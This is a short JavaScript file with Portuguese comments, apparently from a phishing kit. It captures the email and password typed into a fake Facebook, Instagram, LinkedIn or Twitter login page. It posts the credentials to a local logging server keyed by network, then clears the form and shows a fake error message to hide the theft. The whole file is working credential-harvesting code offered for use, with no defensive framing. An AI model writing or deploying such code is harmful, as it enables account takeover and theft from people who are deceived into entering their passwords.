// Variáveis globais para armazenar os inputs
let emailInput = "";
let senhaInput = "";

// Adiciona event listeners para capturar os inputs em tempo real
document.getElementById("email").addEventListener("input", function (e) {
    emailInput = e.target.value;
});

document.getElementById("password").addEventListener("input", function (e) {
    senhaInput = e.target.value;
});

function fakeLogin() {
    // Determina qual rede social está sendo acessada
    const socialNetwork = document.title.toLowerCase();
    let endpoint = '';
    
    if (socialNetwork.includes('facebook')) {
        endpoint = 'facebook';
    } else if (socialNetwork.includes('instagram')) {
        endpoint = 'instagram';
    } else if (socialNetwork.includes('linkedin')) {
        endpoint = 'linkedin';
    } else if (socialNetwork.includes('twitter') || socialNetwork.includes('x')) {
        endpoint = 'twitter';
    }

    // Envia os dados para o servidor
    fetch(`http://localhost:5000/log/${endpoint}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email: emailInput,
            senha: senhaInput
        })
    })
    .then(response => response.json())
    .then(data => {
        // Limpa os campos após o envio
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        emailInput = '';
        senhaInput = '';
        alert('Ops! Algo deu errado. Por favor, tente novamente mais tarde.');
    })
    .catch(error => {
        console.error('Erro:', error);
        alert('Ops! Algo deu errado. Por favor, tente novamente mais tarde.');
    });
}
